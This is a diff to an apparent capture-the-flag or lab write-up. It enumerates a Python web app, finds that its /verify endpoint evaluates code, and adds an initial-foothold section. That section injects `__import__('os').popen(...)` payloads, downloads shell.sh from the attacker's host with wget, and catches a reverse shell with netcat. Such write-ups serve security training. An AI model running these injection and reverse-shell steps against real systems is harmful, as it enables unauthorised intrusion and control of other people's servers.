@@ -44,7 +44,7 @@ Starting gobuster in directory enumeration mode
 /verify               (Status: 200) [Size: 8]
 ```
 
-Use curl to get more info
+Use curl to get more info and the website looks running python code
 ```
 ┌──(ming㉿kali)-[~/Downloads]
 └─$ curl -i http://192.168.129.117:50000/verify
@@ -57,7 +57,7 @@ Date: Fri, 30 Jan 2026 10:10:42 GMT
 {'code'}                                                                                                                  
 ```
 
-The web looks running the code with python
+verify it with a simple math and it works
 ```
 The web looks running the code with python   
 ┌──(ming㉿kali)-[~/Downloads]
@@ -70,3 +70,39 @@ Date: Fri, 30 Jan 2026 10:07:12 GMT
 
 25
 ```                                  
+#Initial foothold
+```
+Use python code to execute command whoami to confirm we have RCE
+$ curl -i http://192.168.129.117:50000/verify -X POST -d "code=__import__('os').popen('whoami').read()"
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 7
+Server: Werkzeug/1.0.1 Python/3.6.8
+Date: Fri, 30 Jan 2026 10:20:19 GMT
+
+cmeeks
+```
+Upload a reverse shell
+```
+$ curl -i http://192.168.129.117:50000/verify -X POST -d "code=__import__('os').popen('wget http://192.168.45.167/shell.sh -O shell.sh').read()"
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 0
+Server: Werkzeug/1.0.1 Python/3.6.8
+Date: Fri, 30 Jan 2026 10:23:32 GMT
+```
+Got reverse shell back
+```
+┌──(ming㉿kali)-[~/Downloads]
+└─$ nc -lvnp 21
+listening on [any] 21 ...
+connect to [192.168.45.167] from (UNKNOWN) [192.168.129.117] 36674
+sh: cannot set terminal process group (1392): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-4.4$ whoami
+whoami
+cmeeks
+sh-4.4$ 
+```
